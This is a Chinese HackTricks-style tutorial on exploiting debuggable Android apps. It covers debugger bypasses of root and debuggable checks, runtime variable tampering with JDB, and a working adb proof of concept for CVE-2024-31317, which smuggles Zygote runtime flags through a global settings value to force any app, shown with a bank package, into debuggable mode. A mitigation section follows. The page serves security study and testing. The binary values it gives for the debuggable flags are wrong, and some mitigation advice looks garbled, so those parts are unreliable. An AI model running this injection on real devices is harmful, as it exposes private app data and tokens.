# 利用可调试应用程序

{{#include ../../banners/hacktricks-training.md}}

# **绕过root和可调试检查**

本节内容是来自帖子 [**https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0**](https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0) 的总结。

## 使Android应用可调试并绕过检查的步骤

### **使应用可调试**

内容基于 https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0

1. **反编译APK：**

- 使用APK-GUI工具反编译APK。
- 在_android-manifest_文件中插入 `android:debuggable="true"` 以启用调试模式。
- 重新编译、签名并zipalign修改后的应用程序。

2. **安装修改后的应用程序：**

- 使用命令： `adb install <application_name>`。

3. **检索包名：**

- 执行 `adb shell pm list packages –3` 列出第三方应用程序并找到包名。

4. **设置应用程序以等待调试器连接：**

- 命令： `adb shell am setup-debug-app –w <package_name>`。
- **注意：** 此命令必须在每次启动应用程序之前运行，以确保它等待调试器。
- 为了持久性，使用 `adb shell am setup-debug-app –w ––persistent <package_name>`。
- 要移除所有标志，使用 `adb shell am clear-debug-app <package_name>`。

5. **在Android Studio中准备调试：**

- 在Android Studio中导航到 _File -> Open Profile or APK_。
- 打开重新编译的APK。

6. **在关键Java文件中设置断点：**
- 在 `MainActivity.java`（特别是在 `onCreate` 方法中）、`b.java` 和 `ContextWrapper.java` 中设置断点。

### **绕过检查**

应用程序在某些时刻会验证是否可调试，并检查指示设备已root的二进制文件。可以使用调试器修改应用信息，取消设置可调试位，并更改搜索的二进制文件名称以绕过这些检查。

对于可调试检查：

1. **修改标志设置：**
- 在调试器控制台的变量部分，导航到： `this mLoadedAPK -> mApplicationInfo -> flags = 814267974`。
- **注意：** `flags = 814267974` 的二进制表示为 `11000011100111011110`，表示“Flag_debuggable”处于活动状态。

![https://miro.medium.com/v2/resize:fit:1400/1*-ckiSbWGSoc1beuxxpKbow.png](https://miro.medium.com/v2/resize:fit:1400/1*-ckiSbWGSoc1beuxxpKbow.png)

这些步骤共同确保应用程序可以被调试，并且可以使用调试器绕过某些安全检查，从而便于对应用程序行为进行更深入的分析或修改。

第2步涉及将标志值更改为814267972，其二进制表示为110000101101000000100010100。

# **利用漏洞**

演示使用了一个包含按钮和文本视图的易受攻击应用程序。最初，应用程序显示“Crack Me”。目标是在运行时将消息从“Try Again”更改为“Hacked”，而不修改源代码。

## **检查漏洞**

- 使用 `apktool` 反编译应用程序以访问 `AndroidManifest.xml` 文件。
- `AndroidManifest.xml` 中存在 `android_debuggable="true"` 表明该应用程序是可调试的，易受利用。
- 值得注意的是，`apktool` 仅用于检查可调试状态，而不修改任何代码。

## **准备设置**

- 该过程涉及启动模拟器，安装易受攻击的应用程序，并使用 `adb jdwp` 识别正在监听的Dalvik VM端口。
- JDWP（Java Debug Wire Protocol）允许调试在VM中运行的应用程序，通过暴露唯一端口。
- 远程调试需要端口转发，然后将JDB附加到目标应用程序。

## **在运行时注入代码**

- 通过设置断点和控制应用程序流程进行利用。
- 使用 `classes` 和 `methods <class_name>` 等命令来揭示应用程序的结构。
- 在 `onClick` 方法处设置断点，并控制其执行。
- 使用 `locals`、`next` 和 `set` 命令检查和修改局部变量，特别是将“Try Again”消息更改为“Hacked”。
- 使用 `run` 命令执行修改后的代码，成功实时更改应用程序的输出。

这个例子演示了如何操纵可调试应用程序的行为，突显了更复杂的利用潜力，例如在应用程序上下文中获得设备的shell访问权限。

---

# 2024 – 将 **任何** 应用程序转变为可调试进程 (CVE-2024-31317)

即使目标APK没有随 `android:debuggable` 标志一起发布，最近的研究表明，可以通过滥用Zygote解析命令行参数的方式，强制 **任意应用程序** 以 `DEBUG_ENABLE_JDWP` 运行时标志启动。

*   **漏洞：** 通过Zygote的命令套接字提供的 `--runtime-flags` 的不当验证，允许能够访问 `system_server` 的攻击者（例如通过拥有 `WRITE_SECURE_SETTINGS` 权限的特权 `adb` shell）注入额外参数。当构造的命令被 `system_server` 重放时，受害者应用程序作为 _可调试_ 进程被分叉，并且有一个JDWP线程在监听。该问题被追踪为 **CVE-2024-31317**，并在2024年6月的Android安全公告中修复。
*   **影响：** 对 **任何** 应用程序（包括特权应用程序如 `com.android.settings`）的私有数据目录的完全读/写访问、令牌窃取、MDM绕过，以及在许多情况下通过滥用现在可调试进程的导出IPC端点直接提升特权的路径。
*   **受影响版本：** Android 9至14，直到2024年6月的补丁级别。

## 快速PoC
```bash
# Requires: adb shell (device must be <2024-06-01 patch-level)
# 1. Inject a fake API-denylist exemption that carries the malicious Zygote flag
adb shell settings put global hidden_api_blacklist_exemptions "--runtime-flags=0x104|Lcom/example/Fake;->entryPoint:"

# 2. Launch the target app – it will be forked with DEBUG_ENABLE_JDWP
adb shell monkey -p com.victim.bank 1

# 3. Enumerate JDWP PIDs and attach with jdb / Android-Studio
adb jdwp               # obtain the PID
adb forward tcp:8700 jdwp:<pid>
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700
```
> 第一步中构造的值使解析器脱离“快速路径”，并附加了第二个合成命令，其中 `--runtime-flags=0x104` (`DEBUG_ENABLE_JDWP | DEBUG_JNI_DEBUGGABLE`) 被接受，就好像是由框架提供的。一旦应用程序被生成，JDWP 套接字被打开，常规动态调试技巧（方法替换、变量修补、实时 Frida 注入等）在 **不修改 APK 或设备启动映像** 的情况下是可能的。

## 检测与缓解

*   修补到 **2024-06-01**（或更高）安全级别 – Google 加固了 `ZygoteCommandBuffer`，以便后续命令无法以这种方式被走私。
*   限制生产设备上的 `WRITE_SECURE_SETTINGS` / `shell` 访问。该漏洞需要此权限，通常只有 ADB 或 OEM 特权应用程序才能拥有。
*   在 EMM/MDM 管理的设备上，强制执行 `ro.debuggable=0` 并通过 `adb disable-verifier` 拒绝 shell 访问。

---

## 参考文献

- [https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0](https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0)
- [https://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications](https://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications)
- [https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.html](https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.html)
- [https://blog.flanker017.me/cve-2024-31317/](https://blog.flanker017.me/cve-2024-31317/)

{{#include ../../banners/hacktricks-training.md}}
